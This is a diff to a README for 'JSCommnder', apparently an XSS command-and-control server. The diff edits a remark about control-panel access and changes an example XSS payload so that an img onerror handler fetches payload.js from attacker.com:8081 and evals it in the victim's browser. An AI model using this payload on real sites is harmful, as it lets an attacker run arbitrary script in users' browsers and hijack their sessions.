@@ -16,11 +16,11 @@ Run the server
 python3 JSCommnder-server.py
 ```
 
-Control panel is available at http://localhost:8080/control_panel.html
+Control panel is only accessible from localhost on the machine you run me on. Available at http://localhost:8080/control_panel.html
 
 You can use XSS payloads to connect to the websocket server. i.e:
 ```html
-<img src="#" onerror='fetch(`http://localhost:8080/payload.js`).then(res=>res.text().then(r=>eval(r)))' style="display:none" />
+<img src="#" onerror='fetch(`http://attacker.com:8081/payload.js`).then(res=>res.text().then(r=>eval(r)))' style="display:none" />
 ``` 
 
 There are 2 testing HTML files to play with.
